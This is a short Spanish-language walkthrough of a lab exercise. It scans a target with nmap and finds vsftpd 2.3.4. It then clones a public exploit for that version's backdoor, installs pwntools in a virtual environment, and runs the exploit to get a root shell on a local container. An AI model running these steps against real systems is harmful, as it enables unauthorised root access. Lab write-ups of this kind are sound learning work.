# MyFirstHacking
## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash

nmap -sV -p 21 <IP_DEL_OBJETIVO>

```

**Resultados Clave:**

*   `21/tcp open ftp vsftpd 2.3.4`: El puerto 21 está abierto y ejecuta el servidor FTP vsftpd versión 2.3.4.

La versión específica de `vsftpd` es una pista crucial, ya que `vsftpd 2.3.4` es famosa por tener una vulnerabilidad de puerta trasera (backdoor).

## 2. Explotación del Servicio FTP

La versión `vsftpd 2.3.4` contiene una puerta trasera maliciosa que permite la ejecución remota de comandos. Esto significa que podemos obtener una shell en el sistema objetivo con privilegios elevados.

### 2.1. Búsqueda y Obtención del Exploit

Buscamos un exploit público para esta vulnerabilidad. Un buen recurso es GitHub o Exploit-DB. 

```bash
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit
```

### 2.2. Resolución de Dependencias (PwnTools)

Al intentar ejecutar el exploit de Python, es común encontrarse con errores de módulos no encontrados, como `ModuleNotFoundError: No module named 'pwn'`. Esto significa que la librería `pwntools`, necesaria para el exploit, no está instalada.

Para solucionar esto de forma limpia y evitar conflictos con otras instalaciones de Python, se recomienda usar un entorno virtual (`venv`).

1.  **Crear un entorno virtual:** Esto aísla las dependencias del proyecto del sistema global de Python.

    ```bash
    python3 -m venv ~/venvs/pwnenv
    ```

2.  **Activar el entorno virtual:** Esto asegura que cualquier paquete que instalemos se guarde dentro de este entorno y no afecte a otras instalaciones de Python.

    ```bash
    source ~/venvs/pwnenv/bin/activate
    ```

3.  **Instalar `pwntools`:** Ahora, instalamos la librería `pwntools` dentro del entorno virtual activo.

    ```bash
    pip install pwntools
    ```

Una vez instalada, el exploit debería poder ejecutarse sin problemas de dependencias.

### 2.3. Ejecución del Exploit

```bash
python3 exploit.py <IP_DEL_OBJETIVO>
```

**Salida del Exploit:**

El exploit se conecta al servicio FTP, activa la puerta trasera y nos proporciona una shell remota.

```

[+] Got Shell!!!

[+] Opening connection to 172.17.0.2 on port 21: Done

[*] Closed connection to 172.17.0.2 port 21

[+] Opening connection to 172.17.0.2 on port 6200: Done

[*] Switching to interactive mode

```

### 2.4. Verificación de Acceso

El comando `whoami` confirma que hemos obtenido una shell con privilegios de `root`.

```bash
whoami
# root
```
